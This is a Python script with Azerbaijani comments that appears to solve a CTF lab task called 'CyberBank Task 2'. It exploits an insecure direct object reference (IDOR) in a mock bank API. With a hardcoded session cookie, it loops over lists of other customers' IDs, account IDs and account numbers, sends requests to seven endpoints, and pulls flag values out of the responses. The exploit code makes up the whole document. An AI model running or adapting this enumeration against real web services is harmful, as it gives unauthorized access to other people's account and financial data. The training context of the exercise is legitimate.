#!/usr/bin/env python3
"""
CyberBank Task 2 — Müxtəlif endpoint-lərdə customer_id ilə IDOR
Flag flag_0 kimi field-də gəlir — balansda yox, profile/info endpoint-ində.
"""

import requests
import json

BASE_URL = "http://web0x06.hbtn"
SESSION  = "vw5CZ4aypAxDEmWUSq7mZ2XOYWfUaSVvcCaOQlRhrdo.5eImUtd-10eJCycNoR4zyDVtIOQ"

HEADERS = {
    "User-Agent"  : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Content-Type": "application/json",
    "Accept"      : "*/*",
    "Referer"     : f"{BASE_URL}/dashboard",
}
COOKIES = {"session": SESSION}

# ─── Bütün customer (contact) ID-ləri ────────────────────────────────────────
CUSTOMERS = {
    "Yosri Musk (OWN)"  : "7b6566c2282545cca1b8dafbba2590d6",
    "Linda Robinson"    : "20f79b3b956a4cdeb167470369e279e2",
    "Robert Martinez"   : "c74fc9478a0a4674bd03d36a919b28a5",
    "Patricia Garcia"   : "9e887e899e484dc685f4442b643404fe",
    "James Thompson"    : "8de2a1df9e7245dfb580ca06056e0cfc",
    "Elizabeth Martin"  : "bb6259382d63430796196a7102556e6b",
    "Brian Harris"      : "eda7fcbbff144a7a8aab04eefd9c4311",
    "Megan White"       : "59b0e6f10a5b4f89aa08f7ccf975822a",
    "Mark Jackson"      : "980ef77f82074fefb44d1fe1ea0599a0",
    "Ashley Thomas"     : "745eb4452f9a41c0a648a7d1128d156a",
    "David Anderson"    : "6a6bb6e09be745b19d6559020522e2fc",
}

# ─── Bütün account ID-ləri ────────────────────────────────────────────────────
ACCOUNT_IDS = {
    "Yosri-acc1"        : "5660050c9db141fab7beb2e0cc617fb5",
    "Yosri-acc2"        : "e87db591dedd4ec58c2601ec15f9b9bd",
    "Linda-acc1"        : "acff92d3d8c545c7b2b8130d4eaba9ad",
    "Linda-acc2"        : "2ecc2dffc9a04b30882968a98979a4c2",
    "Robert-acc1"       : "ac6b2a3cbf5648959ad24401b3f6ce12",
    "Robert-acc2"       : "a9d05c18d01f4f71abe8dd0a24583a4b",
    "Patricia-acc1"     : "6ff2044b20fd47efb6cc4e852c427573",
    "Patricia-acc2"     : "09c9795fb634488db2440728a5d42256",
    "James-acc1"        : "44ec481974954efb8a5b43ff58d0baf1",
    "James-acc2"        : "6ab861adfd97427caece4a4179772f20",
    "Elizabeth-acc1"    : "b77e46932d8943a6bfef812e4535db02",
    "Elizabeth-acc2"    : "d28592db142246dc9f568fb7c01b66ad",
    "Brian-acc1"        : "c6b57dfbe78e4ecf91b065b295f13813",
    "Brian-acc2"        : "5da2a4373312420cbaa7a13baed57676",
    "Megan-acc1"        : "c1ffe2146b594b4aa8028af342959c61",
    "Megan-acc2"        : "c52f28fe85c640eb9af91bfbad534ab5",
    "Mark-acc1"         : "c4c67ed0d9b0429496f8d56f1da91a81",
    "Mark-acc2"         : "5d51b09150c5411ba060e4c331f5f62e",
    "Ashley-acc1"       : "1f996890e16d4a4c95fe8cfedd6931a8",
    "Ashley-acc2"       : "89b91610be8e41939cfa59fa156df2f5",
    "David-acc1"        : "2c80806be67646638e82c9c5bdb2c3b1",
    "David-acc2"        : "e1479d43584c4ce1817d7c596ed54aa3",
}

# ─── Account NÖMRƏLƏRİ ───────────────────────────────────────────────────────
ACCOUNT_NUMBERS = {
    "Yosri-num1"        : "105412819662",
    "Yosri-num2"        : "103862784354",
    "Linda-num1"        : "108697427867",
    "Linda-num2"        : "103588352410",
    "Robert-num1"       : "105530959512",
    "Robert-num2"       : "107900565299",
    "Patricia-num1"     : "103904196048",
    "Patricia-num2"     : "108059236314",
    "James-num1"        : "103705063540",
    "James-num2"        : "102750894305",
    "Elizabeth-num1"    : "103838144252",
    "Elizabeth-num2"    : "107132795133",
    "Brian-num1"        : "104171523919",
    "Brian-num2"        : "105478536598",
    "Megan-num1"        : "103295659517",
    "Megan-num2"        : "109024221955",
    "Mark-num1"         : "101161203277",
    "Mark-num2"         : "101350696937",
    "Ashley-num1"       : "103423595777",
    "Ashley-num2"       : "105691714843",
    "David-num1"        : "103800983875",
    "David-num2"        : "103686369568",
}

def get(path):
    try:
        r = requests.get(f"{BASE_URL}{path}", headers=HEADERS,
                         cookies=COOKIES, timeout=8)
        return r.status_code, r
    except Exception as e:
        return None, str(e)

def post(path, payload):
    try:
        r = requests.post(f"{BASE_URL}{path}", json=payload,
                          headers=HEADERS, cookies=COOKIES, timeout=8)
        return r.status_code, r
    except Exception as e:
        return None, str(e)

def extract_flags(obj, path=""):
    results = []
    if isinstance(obj, dict):
        for k, v in obj.items():
            fp = f"{path}.{k}"
            if "flag" in str(k).lower():
                results.append((fp, str(v)))
            results.extend(extract_flags(v, fp))
    elif isinstance(obj, list):
        for i, item in enumerate(obj):
            results.extend(extract_flags(item, f"{path}[{i}]"))
    elif isinstance(obj, str):
        if any(x in obj.lower() for x in ["hbtn{","htb{","flag{","ctf{"]):
            results.append((path, obj))
    return results

def check(label, code, r):
    """Cavabı yoxla, flag varsa çap et."""
    all_flags = []
    if code == 200:
        try:
            data = r.json()
            flags = extract_flags(data)
            if flags:
                print(f"\n  {'!'*50}")
                for fp, fv in flags:
                    print(f"  *** FLAG TAPILDI [{label}]")
                    print(f"      Field: {fp}")
                    print(f"      Dəyər: {fv}")
                    all_flags.append(fv)
                print(f"  {'!'*50}\n")
            else:
                # Qısa preview
                raw = json.dumps(data)[:100]
                print(f"  ✓ {label} → {raw}")
        except:
            print(f"  ✓ {label} → {r.text[:100]}")
    elif code == 403:
        print(f"  ⛔ {label} → 403 Forbidden")
    elif code == 404:
        print(f"  ✗ {label} → 404 Not Found")
    else:
        print(f"  ? {label} → HTTP {code}")
    return all_flags

def sep(c="─", n=65): print(c * n)


def main():
    sep("═")
    print("  CyberBank Task 2 — Tam Endpoint Enumeration")
    sep("═")
    all_flags = []

    # ── 1. GET /api/customer/info/<customer_id>  (Task 1-in yolu) ────────────
    print("\n[1] GET /api/customer/info/<customer_id>  ← Task 1 yolu\n")
    for name, cid in CUSTOMERS.items():
        code, r = get(f"/api/customer/info/{cid}")
        all_flags += check(f"{name} ({cid})", code, r)

    # ── 2. GET /api/accounts/<account_id>  ───────────────────────────────────
    print("\n[2] GET /api/accounts/<account_id>\n")
    for name, aid in ACCOUNT_IDS.items():
        code, r = get(f"/api/accounts/{aid}")
        all_flags += check(f"{name}", code, r)

    # ── 3. GET /api/accounts/<account_NUMBER>  ───────────────────────────────
    print("\n[3] GET /api/accounts/<account_NUMBER>\n")
    for name, num in ACCOUNT_NUMBERS.items():
        code, r = get(f"/api/accounts/{num}")
        all_flags += check(f"{name} num={num}", code, r)

    # ── 4. POST /api/accounts/info  number field ilə ─────────────────────────
    print("\n[4] POST /api/accounts/info  {number: ...}\n")
    for name, num in ACCOUNT_NUMBERS.items():
        code, r = post("/api/accounts/info", {"number": num})
        all_flags += check(f"{name}", code, r)

    # ── 5. GET /api/customer/<customer_id>/accounts  ──────────────────────────
    print("\n[5] GET /api/customer/<customer_id>/accounts\n")
    for name, cid in CUSTOMERS.items():
        code, r = get(f"/api/customer/{cid}/accounts")
        all_flags += check(f"{name}", code, r)

    # ── 6. GET /api/customer/transactions/<customer_id>  ─────────────────────
    print("\n[6] GET /api/customer/transactions/<customer_id>\n")
    for name, cid in CUSTOMERS.items():
        code, r = get(f"/api/customer/transactions/{cid}")
        all_flags += check(f"{name}", code, r)

    # ── 7. POST /api/customer/info  {customer_id: ...}  ──────────────────────
    print("\n[7] POST /api/customer/info  {customer_id: ...}\n")
    for name, cid in CUSTOMERS.items():
        code, r = post("/api/customer/info", {"customer_id": cid})
        all_flags += check(f"{name}", code, r)

    # ── XÜLASİ ────────────────────────────────────────────────────────────────
    sep("═")
    if all_flags:
        print("\n  TAPILAN FLAGLAR:")
        for f in set(all_flags):
            print(f"  >>> {f}")
    else:
        print("\n  Heç bir flag tapılmadı.")
        print("  → Lütfən script-in tam output-unu göndər")
        print("    (xüsusilə hansı endpoint-lər 200 qaytardı)")
    sep("═")


if __name__ == "__main__":
    main()
